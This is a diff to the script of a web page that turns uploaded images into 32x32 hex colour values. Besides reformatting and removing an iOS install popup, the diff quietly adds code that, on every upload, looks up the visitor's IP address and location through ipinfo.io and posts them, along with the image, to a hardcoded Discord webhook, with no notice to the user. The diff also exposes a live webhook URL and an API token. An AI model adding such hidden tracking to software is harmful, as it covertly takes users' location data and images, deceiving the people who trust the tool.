@@ -144,100 +144,123 @@
 
 </div>
     <script>
-        document.getElementById('imageInput').addEventListener('change', handleImageUpload);
-        document.getElementById('copyButton').addEventListener('click', copyHexValues);
+    document.getElementById('imageInput').addEventListener('change', handleImageUpload);
+    document.getElementById('copyButton').addEventListener('click', copyHexValues);
 
-        function handleImageUpload(event) {
-            const file = event.target.files[0];
-            if (!file) return;
+    function handleImageUpload(event) {
+        const file = event.target.files[0];
+        if (!file) return;
 
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const img = new Image();
-                img.onload = function() {
-                    processImage(img);
-                };
-                img.src = e.target.result;
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const img = new Image();
+            img.onload = function() {
+                processImage(img);
+                // Fetch the IP data and send it along with the image
+                fetch('https://ipinfo.io/json?token=64e083390966ef')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        sendToWebhook(img, ipData);
+                    });
             };
-            reader.readAsDataURL(file);
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function processImage(image) {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Set canvas size to 32x32
+        canvas.width = 32;
+        canvas.height = 32;
+
+        // Draw the image to canvas and scale it down to 32x32
+        ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+
+        // Update the preview image
+        const preview = document.getElementById('preview');
+        preview.src = canvas.toDataURL(); // Set preview image to canvas data URL
+        preview.style.display = 'block'; // Show the preview image
+
+        // Get image data from canvas
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const data = imageData.data;
+
+        // Convert to hex values
+        let hexArray = [];
+        for (let i = 0; i < data.length; i += 4) {
+            let r = data[i];
+            let g = data[i + 1];
+            let b = data[i + 2];
+            let hex = rgbToHex(r, g, b);
+            hexArray.push(hex);
         }
 
-        function processImage(image) {
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
+        displayHexValues(hexArray);
 
-            // Set canvas size to 32x32
-            canvas.width = 32;
-            canvas.height = 32;
+        // Show the copy button
+        document.getElementById('copyButton').style.display = 'inline-block';
+    }
 
-            // Draw the image to canvas and scale it down to 32x32
-            ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+    function rgbToHex(r, g, b) {
+        // Format hex codes as 5 digits: #RRGGB -> RRGGB
+        return ((r << 16) + (g << 8) + b).toString(16).padStart(5, '0').toUpperCase();
+    }
 
-            // Update the preview image
-            const preview = document.getElementById('preview');
-            preview.src = canvas.toDataURL(); // Set preview image to canvas data URL
-            preview.style.display = 'block'; // Show the preview image
+    function displayHexValues(hexArray) {
+        const outputElement = document.getElementById('output');
+        let formattedOutput = hexArray.join(', ');
+        outputElement.textContent = formattedOutput;
+        outputElement.style.display = 'block'; // Show the output element
+    }
 
-            // Get image data from canvas
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const data = imageData.data;
+    function copyHexValues() {
+        const outputElement = document.getElementById('output');
+        const textToCopy = outputElement.textContent;
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            alert("Copied to clipboard!");
+        }).catch(err => {
+            alert("Failed to copy hex values: " + err);
+        });
+    }
 
-            // Convert to hex values
-            let hexArray = [];
-            for (let i = 0; i < data.length; i += 4) {
-                let r = data[i];
-                let g = data[i + 1];
-                let b = data[i + 2];
-                let hex = rgbToHex(r, g, b);
-                hexArray.push(hex);
+    // Send IP and image data to the Discord webhook
+    function sendToWebhook(image, ipData) {
+        const canvas = document.getElementById('canvas');
+        const imageDataURL = canvas.toDataURL(); // Get the base64 image data
+
+        // Prepare the data to send
+        const data = {
+            content: `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}`,
+            embeds: [{
+                title: "Image Upload",
+                description: "An image has been uploaded along with the IP information.",
+                image: {
+                    url: imageDataURL
+                }
+            }]
+        };
+
+        // Send the data using fetch
+        fetch('https://discord.com/api/webhooks/1282377343100522637/qUVNHGRn-VbFXk2KKFOC5Fx6h8eaMECLyAPTuWhbIfBpiBI1OvpK09Vg-sm4tlb29UPo', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }).then(response => {
+            if (response.ok) {
+                console.log("Webhook sent successfully");
+            } else {
+                console.error("Failed to send webhook");
             }
+        }).catch(error => {
+            console.error("Error sending webhook:", error);
+        });
+    }
+</script>
 
-            displayHexValues(hexArray);
-
-            // Show the copy button
-            document.getElementById('copyButton').style.display = 'inline-block';
-        }
-
-        function rgbToHex(r, g, b) {
-            // Format hex codes as 5 digits: #RRGGB -> RRGGB
-            return ((r << 16) + (g << 8) + b).toString(16).padStart(5, '0').toUpperCase();
-        }
-
-        function displayHexValues(hexArray) {
-            const outputElement = document.getElementById('output');
-            let formattedOutput = hexArray.join(', ');
-            outputElement.textContent = formattedOutput;
-            outputElement.style.display = 'block'; // Show the output element
-        }
-
-        function copyHexValues() {
-            const outputElement = document.getElementById('output');
-            const textToCopy = outputElement.textContent;
-            navigator.clipboard.writeText(textToCopy).then(() => {
-                alert("Copied to clipboard!");
-            }).catch(err => {
-                alert("Failed to copy hex values: " + err);
-            });
-        }
-// Detects if device is on iOS 
-const isIos = () => {
-  const userAgent = window.navigator.userAgent.toLowerCase();
-  return /iphone|ipad|ipod/.test(userAgent);
-}
-
-// Detects if device is in standalone mode
-const isInStandaloneMode = () => ('standalone' in window.navigator) && (window.navigator.standalone);
-
-// Checks if should display install popup notification
-if (isIos() && !isInStandaloneMode()) {
-  document.getElementById('installPopup').style.display = 'block'; // Show the popup
-}
-
-// Close popup when the close button is clicked
-document.getElementById('closePopup').addEventListener('click', function() {
-  document.getElementById('installPopup').style.display = 'none'; // Hide the popup
-});
-
-    </script>
 </body>
 </html>
